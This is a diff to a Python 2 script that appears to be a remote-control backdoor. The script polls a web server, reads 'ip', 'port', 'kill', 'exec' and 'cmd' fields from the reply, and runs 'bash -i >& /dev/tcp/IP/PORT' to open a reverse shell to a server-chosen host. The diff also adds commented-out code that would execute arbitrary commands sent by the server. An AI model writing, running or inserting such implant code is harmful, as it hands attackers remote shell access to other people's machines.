@@ -3,7 +3,9 @@ import time
 import sys
 import os
 import httplib
+import subprocess
 from os import path, access, R_OK
+from subprocess import Popen
 
 import socket
 if socket.gethostname().find('.')>=0:
@@ -29,11 +31,25 @@ try:
         sport = sresponse[ifind+5:sresponse.find('||',ifind)]
         ifind=sresponse.find('kill=')
         skill = sresponse[ifind+5:sresponse.find('||',ifind)]
+        ifind=sresponse.find('exec=')
+        sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
+        ifind=sresponse.find('cmd=')
+        scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
         print skill
         httpServ.close()
+    if sexec == '1':
+    	#os.system(scmd)
+    	print scmd
+    	#p = Popen(scmd,shell='false')
+    	
+    	#httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
+        #os.system("wait")
     if skill == '0':
+    	#p = Popen("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
         os.system("bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
+        #httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
         os.system("wait")
+    
 except Exception,e:
     print str(e)  
     
